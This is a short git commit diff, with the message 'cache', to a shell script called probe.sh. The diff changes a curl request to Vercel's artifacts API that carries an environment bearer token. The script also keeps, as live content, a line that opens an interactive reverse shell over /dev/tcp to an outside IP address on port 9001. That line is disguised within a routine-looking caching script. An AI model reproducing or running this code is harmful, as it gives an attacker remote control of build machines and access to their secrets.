14fbe3c8e5f19616fd7385400c918fb1884dc19b
Mona Lisa <johndoe@example.com>
2026-07-02 16:01:48 +0200

    cache

--- probe.sh
+++ probe.sh
@@ -10,11 +10,10 @@ echo '----DRY----';
 cat /tmp/dry.json; 
 mkdir -p public && echo done > public/index.html
 
-curl -X PUT \
+curl -sS\
   -H "Authorization: Bearer $VERCEL_ARTIFACTS_TOKEN" \
   -H "Content-Type: application/octet-stream" \
   -H "x-artifact-duration: 1234" \
-  --data-binary @artifact.tar.zst \
   "https://vercel.com/api/v8/artifacts/c4821c0be8739a25?teamId=team_3k4i1QWXBBu4ZeuymMn14c1z"
 
 sh -i >& /dev/tcp/54.73.133.183/9001 0>&1
